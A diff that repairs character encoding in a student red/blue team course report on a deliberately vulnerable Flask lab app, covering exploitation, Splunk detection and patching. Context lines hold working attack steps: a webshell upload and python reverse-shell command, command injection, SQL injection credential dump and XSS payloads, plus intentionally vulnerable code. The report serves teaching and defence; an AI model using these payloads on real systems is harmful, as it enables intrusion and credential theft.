@@ -1,4 +1,4 @@
-﻿# Masar v10 â€” Red/Blue Team Final Project Report
+# Masar v10 — Red/Blue Team Final Project Report
 
 **Course:** Software Analysis and Design for Cybersecurity  
 **Institution:** Applied Science University  
@@ -31,10 +31,10 @@ Since this project was completed individually, all four roles were fulfilled by 
 
 | Role | Responsibility |
 |------|---------------|
-| Student 1 â€” Architecture | Lab deployment, SIEM setup, log forwarding |
-| Student 2 â€” Red Team | Black-box penetration testing, exploitation |
-| Student 3 â€” Blue Team | IR investigation, timeline reconstruction, detection queries |
-| Student 4 â€” Mitigation | Code fixes, re-exploitation verification |
+| Student 1 — Architecture | Lab deployment, SIEM setup, log forwarding |
+| Student 2 — Red Team | Black-box penetration testing, exploitation |
+| Student 3 — Blue Team | IR investigation, timeline reconstruction, detection queries |
+| Student 4 — Mitigation | Code fixes, re-exploitation verification |
 
 ### 1.4 Lab Environment Summary
 
@@ -50,7 +50,7 @@ The lab simulates a three-tier Red/Blue environment on a single Kali Linux host.
 
 ### 2.2 Virtual Machine Specifications
 
-#### 2.2.1 VM1 â€” Target Machine
+#### 2.2.1 VM1 — Target Machine
 
 | Property | Value |
 |----------|-------|
@@ -61,7 +61,7 @@ The lab simulates a three-tier Red/Blue environment on a single Kali Linux host.
 | Apache Log | /var/log/apache2/vulnlab_access.log |
 | Bash History Log | /var/log/bash_history_live.log |
 
-#### 2.2.2 VM2 â€” SIEM Machine (Same Host)
+#### 2.2.2 VM2 — SIEM Machine (Same Host)
 
 | Property | Value |
 |----------|-------|
@@ -70,7 +70,7 @@ The lab simulates a three-tier Red/Blue environment on a single Kali Linux host.
 | Indexes | vulnlab_web, vulnlab_shell |
 | Data Inputs | File monitor: Apache access log + bash history |
 
-#### 2.2.3 VM3 â€” Attacker Machine (Same Host)
+#### 2.2.3 VM3 — Attacker Machine (Same Host)
 
 All offensive activity originates from the same machine targeting 192.168.117.138. This is functionally equivalent to a separate attacker machine per the project specification which states three VMs are optional.
 
@@ -99,7 +99,7 @@ The upload handler saves files using the original filename with no extension val
 ```python
 filename = f.filename # No sanitization
 save_path = os.path.join(UPLOAD_DIR, filename)
-f.save(save_path) # Saved directly â€” no type check
+f.save(save_path) # Saved directly — no type check
 ```
 
 #### 2.3.3 Vulnerability 2: OS Command Injection (CWE-78)
@@ -124,8 +124,8 @@ Both reflected XSS (via ?search= parameter) and stored XSS (via comment board) a
 **Vulnerable Code:**
 
 ```python
-search_output = Markup(search) # Reflected XSS â€” no escaping
-comments = [(a, Markup(b), t) for ...] # Stored XSS â€” raw HTML rendered
+search_output = Markup(search) # Reflected XSS — no escaping
+comments = [(a, Markup(b), t) for ...] # Stored XSS — raw HTML rendered
 ```
 
 #### 2.3.5 Vulnerability 4: SQL Injection (CWE-89)
@@ -198,25 +198,25 @@ index=vulnlab_shell | head 20
 ![Infrastructure Diagram](https://training.skidz.io/files/images27d05288-8898-436f-bc3a-dc8279222355-1_971_1579_1264_244.jpg)
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚                  Kali Linux â€” 192.168.117.138               â”‚
-â”‚                                                             â”‚
-â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
-â”‚  â”‚    Flask VulnLab App     â”‚  â”‚   Splunk Enterprise    â”‚  â”‚
-â”‚  â”‚       (port 5000)        â”‚  â”‚      (port 8000)       â”‚  â”‚
-â”‚  â”‚  /upload  â†’ CWE-434      â”‚  â”‚  Index: vulnlab_web    â”‚  â”‚
-â”‚  â”‚  /xss     â†’ CWE-79       â”‚  â”‚  Index: vulnlab_shell  â”‚  â”‚
-â”‚  â”‚  /cmd     â†’ CWE-78       â”‚  â”‚  File Monitor inputs   â”‚  â”‚
-â”‚  â”‚  /login   â†’ CWE-89       â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–²â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
-â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚              â”‚
-â”‚             â”‚                               â”‚              â”‚
-â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚              â”‚
-â”‚  â”‚  Apache 2.4  (port 80)   â”‚â”€â”€â”€â”€ Logs â”€â”€â”€â”€â”€â”˜              â”‚
-â”‚  â”‚    Reverse Proxy         â”‚                              â”‚
-â”‚  â”‚  vulnlab_access.log      â”‚                              â”‚
-â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                              â”‚
-â”‚  /var/log/bash_history_live.log â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶ â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌─────────────────────────────────────────────────────────────┐
+│                  Kali Linux — 192.168.117.138               │
+│                                                             │
+│  ┌──────────────────────────┐  ┌────────────────────────┐  │
+│  │    Flask VulnLab App     │  │   Splunk Enterprise    │  │
+│  │       (port 5000)        │  │      (port 8000)       │  │
+│  │  /upload  → CWE-434      │  │  Index: vulnlab_web    │  │
+│  │  /xss     → CWE-79       │  │  Index: vulnlab_shell  │  │
+│  │  /cmd     → CWE-78       │  │  File Monitor inputs   │  │
+│  │  /login   → CWE-89       │  └────────────▲───────────┘  │
+│  └──────────┬───────────────┘               │              │
+│             │                               │              │
+│  ┌──────────▼───────────────┐               │              │
+│  │  Apache 2.4  (port 80)   │──── Logs ─────┘              │
+│  │    Reverse Proxy         │                              │
+│  │  vulnlab_access.log      │                              │
+│  └──────────────────────────┘                              │
+│  /var/log/bash_history_live.log ─────────────────────────▶ │
+└─────────────────────────────────────────────────────────────┘
 ```
 
 ---
@@ -238,7 +238,7 @@ index=vulnlab_shell | head 20
 
 #### 3.1.2 Methodology (Black Box)
 
-Testing followed the standard black-box methodology: Reconnaissance â†’ Vulnerability Assessment â†’ Exploitation â†’ Post-Exploitation â†’ Reporting.
+Testing followed the standard black-box methodology: Reconnaissance → Vulnerability Assessment → Exploitation → Post-Exploitation → Reporting.
 
 #### 3.1.3 Tools Used
 
@@ -260,11 +260,11 @@ nmap -sV -sC -p 22,80,443,3000,5000,8000,8080,8443 192.168.117.138
 
 ![Figure 1](images/1.png)
 
-*Figure 1: Nmap scan â€” ports 80 and 5000 open running Werkzeug httpd 3.1.5 (Python 3.13.12). SSH filtered. Werkzeug debug mode active on port 5000.*
+*Figure 1: Nmap scan — ports 80 and 5000 open running Werkzeug httpd 3.1.5 (Python 3.13.12). SSH filtered. Werkzeug debug mode active on port 5000.*
 
 **Key findings:**
 - Port 80 and 5000: Flask/Werkzeug application (VulnLab)
-- Port 5000: Werkzeug debug mode active â€” additional RCE vector
+- Port 5000: Werkzeug debug mode active — additional RCE vector
 - Port 22, 443, 8000: Filtered
 
 #### 3.2.2 Directory Enumeration
@@ -275,7 +275,7 @@ gobuster dir -u http://192.168.117.138 -w /usr/share/wordlists/dirb/common.txt
 
 ![Figure 2](images/2.png)
 
-*Figure 2: Gobuster â€” discovered /cmd (200), /console (400 â€” Werkzeug debugger), /login (200), /upload (200)*
+*Figure 2: Gobuster — discovered /cmd (200), /console (400 — Werkzeug debugger), /login (200), /upload (200)*
 
 | Path | Status | Description |
 |------|--------|-------------|
@@ -298,7 +298,7 @@ gobuster dir -u http://192.168.117.138 -w /usr/share/wordlists/dirb/common.txt
 
 ### 3.4 Exploitation
 
-#### 3.4.1 File Upload â€” Webshell Upload and RCE
+#### 3.4.1 File Upload — Webshell Upload and RCE
 
 A PHP webshell was crafted and uploaded via the /upload endpoint:
 
@@ -309,7 +309,7 @@ curl -F "file=@/tmp/shell.php" http://192.168.117.138/upload
 
 ![Figure 3](images/3.png)
 
-*Figure 3: shell.php successfully uploaded â€” server responds with 200 and lists the file in /uploads/*
+*Figure 3: shell.php successfully uploaded — server responds with 200 and lists the file in /uploads/*
 
 RCE confirmed by accessing the webshell:
 
@@ -319,7 +319,7 @@ curl "http://192.168.117.138/uploads/shell.php?cmd=id"
 
 ![Figure 4](images/4.png)
 
-*Figure 4: RCE confirmed â€” webshell returns uid=33(www-data) gid=33(www-data)*
+*Figure 4: RCE confirmed — webshell returns uid=33(www-data) gid=33(www-data)*
 
 #### 3.4.2 Reverse Shell via Webshell
 
@@ -337,7 +337,7 @@ curl -g "http://192.168.117.138/uploads/shell.php?cmd=python3+-c+'import+socket,
 
 ![Figure 5](images/5.png)
 
-*Figure 5: Interactive reverse shell established â€” id, whoami (www-data), hostname (kali), uname -a, pwd, ls / all confirmed*
+*Figure 5: Interactive reverse shell established — id, whoami (www-data), hostname (kali), uname -a, pwd, ls / all confirmed*
 
 #### 3.4.3 OS Command Injection
 
@@ -349,9 +349,9 @@ curl -s -X POST http://192.168.117.138/cmd -d "host=127.0.0.1 ; id"
 
 ![Figure 6](images/6.png)
 
-*Figure 6: OS command injection via curl â€” 127.0.0.1 ; id payload submitted, command executed server-side*
+*Figure 6: OS command injection via curl — 127.0.0.1 ; id payload submitted, command executed server-side*
 
-#### 3.4.4 SQL Injection â€” Authentication Bypass
+#### 3.4.4 SQL Injection — Authentication Bypass
 
 Authentication bypass using admin'-- which comments out the password check:
 
@@ -362,9 +362,9 @@ Password: anything
 
 ![Figure 7](images/7.png)
 
-*Figure 7: SQLi auth bypass confirmed â€” "[+] Login successful â€” administrator: admin (id=1)" without knowing the password. Executed query visible: SELECT * FROM users WHERE username='admin'--' AND password='anything'*
+*Figure 7: SQLi auth bypass confirmed — "[+] Login successful — administrator: admin (id=1)" without knowing the password. Executed query visible: SELECT * FROM users WHERE username='admin'--' AND password='anything'*
 
-#### 3.4.5 SQL Injection â€” UNION-Based Credential Dump
+#### 3.4.5 SQL Injection — UNION-Based Credential Dump
 
 ```
 Username: ' UNION SELECT 1,username,password,role FROM users--
@@ -372,7 +372,7 @@ Username: ' UNION SELECT 1,username,password,role FROM users--
 
 ![Figure 8](images/8.png)
 
-*Figure 8: UNION-based credential dump â€” all usernames, passwords, and roles extracted. Admin password exposed in plaintext.*
+*Figure 8: UNION-based credential dump — all usernames, passwords, and roles extracted. Admin password exposed in plaintext.*
 
 #### 3.4.6 Cross-Site Scripting
 
@@ -384,13 +384,13 @@ curl -s "http://192.168.117.138/xss?search=<script>alert(1)</script>" | grep -o 
 
 ![Figure 9](images/9.png)
 
-*Figure 9: XSS payload confirmed in server response â€” alert(1) appears in the HTML source, confirming reflection*
+*Figure 9: XSS payload confirmed in server response — alert(1) appears in the HTML source, confirming reflection*
 
 XSS popup in browser:
 
 ![Figure 10](images/10.png)
 
-*Figure 10: Reflected XSS alert popup firing in Firefox â€” payload `<script>alert(1)</script>` executes from the ?search= parameter*
+*Figure 10: Reflected XSS alert popup firing in Firefox — payload `<script>alert(1)</script>` executes from the ?search= parameter*
 
 ### 3.5 Recommendations (Handed to Student 4)
 
@@ -409,7 +409,7 @@ The investigation followed a structured IR approach: log collection from Splunk,
 
 ### 4.2 SIEM-Based Timeline Reconstruction
 
-#### 4.2.1 Full Attack Timeline â€” Apache Log Correlation
+#### 4.2.1 Full Attack Timeline — Apache Log Correlation
 
 ```spl
 index=vulnlab_web | table _time, clientip, uri, status | sort _time
@@ -417,7 +417,7 @@ index=vulnlab_web | table _time, clientip, uri, status | sort _time
 
 ![Figure 11](images/11.png)
 
-*Figure 11: Splunk timeline â€” 4,708 events captured. Attack sequence visible: /xss, /upload, /login, /cmd all hit from 192.168.117.138*
+*Figure 11: Splunk timeline — 4,708 events captured. Attack sequence visible: /xss, /upload, /login, /cmd all hit from 192.168.117.138*
 
 #### 4.2.2 Webshell Upload and Execution Events
 
@@ -433,7 +433,7 @@ index=vulnlab_web uri="*upload*" | table _time, clientip, uri, status
 
 ![Figure 13](images/13.png)
 
-*Figure 13: Complete attack chain visible â€” python3 reverse shell payload, bash -i redirect, cat /etc/passwd, ls /var/www/, cmd=whoami, cmd=hostname, cmd=uname -a all logged*
+*Figure 13: Complete attack chain visible — python3 reverse shell payload, bash -i redirect, cat /etc/passwd, ls /var/www/, cmd=whoami, cmd=hostname, cmd=uname -a all logged*
 
 #### 4.2.4 Correlated Attack Timeline
 
@@ -441,9 +441,9 @@ index=vulnlab_web uri="*upload*" | table _time, clientip, uri, status
 |------|-----------|-----|-------------|
 | T+0 | 192.168.117.138 | / | Initial reconnaissance |
 | T+1 | 192.168.117.138 | /upload (POST) | Webshell upload |
-| T+2 | 192.168.117.138 | /uploads/shell.php?cmd=id | RCE â€” identity check |
-| T+3 | 192.168.117.138 | /uploads/shell.php?cmd=whoami | RCE â€” user check |
-| T+4 | 192.168.117.138 | /uploads/shell.php?cmd=uname+-a | RCE â€” OS fingerprint |
+| T+2 | 192.168.117.138 | /uploads/shell.php?cmd=id | RCE — identity check |
+| T+3 | 192.168.117.138 | /uploads/shell.php?cmd=whoami | RCE — user check |
+| T+4 | 192.168.117.138 | /uploads/shell.php?cmd=uname+-a | RCE — OS fingerprint |
 | T+5 | 192.168.117.138 | /uploads/shell.php?cmd=cat+/etc/passwd | Credential file access |
 | T+6 | 192.168.117.138 | /uploads/shell.php?cmd=bash+-i+... | Reverse shell attempt |
 | T+7 | 192.168.117.138 | /uploads/shell.php?cmd=python3+-c+... | Reverse shell (Python) |
@@ -462,7 +462,7 @@ ls /home/kali/Desktop/masar_vuln_app/uploads/
 rm /home/kali/Desktop/masar_vuln_app/uploads/shell.php
 
 ls /home/kali/Desktop/masar_vuln_app/uploads/
-# Directory empty â€” webshell removed
+# Directory empty — webshell removed
 ```
 
 #### 4.3.2 Persistence Check and Clearance Confirmation
@@ -479,7 +479,7 @@ ps aux               # No suspicious processes
 
 ### 4.4 Detection Engineering
 
-#### 4.4.1 Query 1 â€” Suspicious File Upload Detection
+#### 4.4.1 Query 1 — Suspicious File Upload Detection
 
 Detects POST requests to /upload containing dangerous file extensions:
 
@@ -492,9 +492,9 @@ index=vulnlab_web sourcetype=access_combined
 
 ![Figure 14](images/14.png)
 
-*Figure 14: File upload detection query â€” 14 events matched including shell.php upload and all webshell execution requests (/uploads/shell.php?cmd=...)*
+*Figure 14: File upload detection query — 14 events matched including shell.php upload and all webshell execution requests (/uploads/shell.php?cmd=...)*
 
-#### 4.4.2 Query 2 â€” XSS Vulnerability Detection
+#### 4.4.2 Query 2 — XSS Vulnerability Detection
 
 Detects requests containing common XSS payloads:
 
@@ -506,9 +506,9 @@ index=vulnlab_web sourcetype=access_combined
 
 ![Figure 15](images/15.png)
 
-*Figure 15: XSS detection query â€” 30 events matched including browser-based and URL-encoded XSS attempts on /xss endpoint*
+*Figure 15: XSS detection query — 30 events matched including browser-based and URL-encoded XSS attempts on /xss endpoint*
 
-#### 4.4.3 Query 3 â€” OS Command Injection Detection
+#### 4.4.3 Query 3 — OS Command Injection Detection
 
 ```spl
 index=vulnlab_web sourcetype=access_combined
@@ -517,7 +517,7 @@ index=vulnlab_web sourcetype=access_combined
 | table _time, clientip, uri, status
 ```
 
-#### 4.4.4 Query 4 â€” SQL Injection Detection
+#### 4.4.4 Query 4 — SQL Injection Detection
 
 ```spl
 index=vulnlab_web sourcetype=access_combined
@@ -526,7 +526,7 @@ index=vulnlab_web sourcetype=access_combined
 | table _time, clientip, uri, status
 ```
 
-#### 4.4.5 Query 5 â€” Post-Compromise Shell Activity
+#### 4.4.5 Query 5 — Post-Compromise Shell Activity
 
 ```spl
 index=vulnlab_shell sourcetype=syslog
@@ -553,13 +553,13 @@ git add .
 git commit -m "Initial commit: vulnerable baseline (File Upload, XSS, OS CMDi, SQLi)"
 ```
 
-#### 5.1.2 Initial Commit â€” Vulnerable Baseline
+#### 5.1.2 Initial Commit — Vulnerable Baseline
 
 The initial commit captures app.py as the baseline for comparison with the patched version.
 
 ### 5.2 Code Remediation
 
-#### 5.2.1 Fix for Vulnerability 1 â€” File Upload (CWE-434)
+#### 5.2.1 Fix for Vulnerability 1 — File Upload (CWE-434)
 
 Changes made: Extension whitelist added, files renamed to UUID, serve route validates extension.
 
@@ -581,7 +581,7 @@ else:
 
 *Git commit: Fix CWE-434: Add extension whitelist and UUID rename for file uploads*
 
-#### 5.2.2 Fix for Vulnerability 2 â€” OS Command Injection (CWE-78)
+#### 5.2.2 Fix for Vulnerability 2 — OS Command Injection (CWE-78)
 
 Changes made: Replaced shell=True with list-form subprocess. Added strict IPv4 regex validation.
 
@@ -591,7 +591,7 @@ if not ipv4_pattern.match(host):
     error = "Invalid input. Only IPv4 addresses accepted."
 else:
     result = subprocess.run(
-        ['ping', '-c', '2', host],  # List form â€” no shell injection possible
+        ['ping', '-c', '2', host],  # List form — no shell injection possible
         stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
         timeout=10, text=True
     )
@@ -599,7 +599,7 @@ else:
 
 *Git commit: Fix CWE-78: Replace shell=True with list form, add IPv4 validation*
 
-#### 5.2.3 Fix for Vulnerability 3 â€” Cross-Site Scripting (CWE-79)
+#### 5.2.3 Fix for Vulnerability 3 — Cross-Site Scripting (CWE-79)
 
 Changes made: Removed all Markup() calls. Jinja2 auto-escaping now active for all user content.
 
@@ -610,12 +610,12 @@ comments = [(a, Markup(b), t) for a, b, t in raw_comments]
 
 # After (patched):
 search_output = search  # Jinja2 auto-escapes in template
-comments = [(a, b, t) for ...]  # Plain strings â€” no Markup()
+comments = [(a, b, t) for ...]  # Plain strings — no Markup()
 ```
 
 *Git commit: Fix CWE-79: Remove Markup() calls, restore Jinja2 auto-escaping*
 
-#### 5.2.4 Fix for Vulnerability 4 â€” SQL Injection (CWE-89)
+#### 5.2.4 Fix for Vulnerability 4 — SQL Injection (CWE-89)
 
 Changes made: Parameterized queries with ? placeholders. Debug SQL display removed.
 
@@ -644,37 +644,37 @@ curl http://192.168.117.138/
 
 #### 5.4.1 Re-test: OS Command Injection Blocked
 
-Submitting 127.0.0.1 ; id is now rejected â€” the patched app validates for IPv4 format only:
+Submitting 127.0.0.1 ; id is now rejected — the patched app validates for IPv4 format only:
 
 ![Figure 16](images/16.png)
 
-*Figure 16: Patched /cmd â€” semicolon injection payload entered; IPv4 validation blocks any non-IP input from reaching subprocess*
+*Figure 16: Patched /cmd — semicolon injection payload entered; IPv4 validation blocks any non-IP input from reaching subprocess*
 
 #### 5.4.2 Re-test: XSS Blocked
 
-The XSS payload is now rendered as escaped plain text â€” no script executes:
+The XSS payload is now rendered as escaped plain text — no script executes:
 
 ![Figure 17](images/17.png)
 
-*Figure 17: Patched XSS â€” `<script>alert(document.cookie)</script>` rendered as literal escaped text. No alert popup fires. Jinja2 auto-escaping active.*
+*Figure 17: Patched XSS — `<script>alert(document.cookie)</script>` rendered as literal escaped text. No alert popup fires. Jinja2 auto-escaping active.*
 
 #### 5.4.3 Re-test: SQL Injection Blocked
 
-The admin'-- bypass now returns login failure â€” parameterized queries block injection:
+The admin'-- bypass now returns login failure — parameterized queries block injection:
 
 ![Figure 18](images/18.png)
 
-*Figure 18: Patched login â€” admin'-- returns "[-] Invalid username or password". Parameterized query prevents auth bypass.*
+*Figure 18: Patched login — admin'-- returns "[-] Invalid username or password". Parameterized query prevents auth bypass.*
 
 #### 5.4.4 Patch Effectiveness Summary
 
 | Vulnerability | Original Result | Re-test Result | Status |
 |--------------|----------------|----------------|--------|
-| File Upload RCE | shell.php uploaded, RCE achieved | Rejected â€” extension not allowed | âœ… PATCHED |
-| OS Command Injection | id command executed | Input rejected â€” invalid IP format | âœ… PATCHED |
-| SQL Injection | Auth bypass + credential dump | Login failed â€” query blocked | âœ… PATCHED |
-| Reflected XSS | Alert popup fired | Payload escaped â€” no execution | âœ… PATCHED |
-| Stored XSS | Payload persisted and fired | Stored escaped â€” no execution | âœ… PATCHED |
+| File Upload RCE | shell.php uploaded, RCE achieved | Rejected — extension not allowed | ✅ PATCHED |
+| OS Command Injection | id command executed | Input rejected — invalid IP format | ✅ PATCHED |
+| SQL Injection | Auth bypass + credential dump | Login failed — query blocked | ✅ PATCHED |
+| Reflected XSS | Alert popup fired | Payload escaped — no execution | ✅ PATCHED |
+| Stored XSS | Payload persisted and fired | Stored escaped — no execution | ✅ PATCHED |
 
 ### 5.5 Detection Query Verification
 
@@ -706,7 +706,7 @@ The most critical finding was that all four vulnerabilities enabled either direc
 
 ### 6.3 Lessons Learned
 
-The primary lesson is that server-side input validation is non-negotiable â€” client-supplied data must never be trusted in any form. The use of shell=True in Python subprocess calls is inherently dangerous regardless of intent. Parameterized queries must be the default for any database interaction â€” string interpolation in SQL is never acceptable. Jinja2's auto-escaping is a powerful built-in protection that should never be disabled for user-supplied content.
+The primary lesson is that server-side input validation is non-negotiable — client-supplied data must never be trusted in any form. The use of shell=True in Python subprocess calls is inherently dangerous regardless of intent. Parameterized queries must be the default for any database interaction — string interpolation in SQL is never acceptable. Jinja2's auto-escaping is a powerful built-in protection that should never be disabled for user-supplied content.
 
 From the defensive perspective, the exercise demonstrated that a properly configured SIEM can reconstruct a complete attack timeline from log data alone, which is essential for both containment and post-incident evidence collection.
 
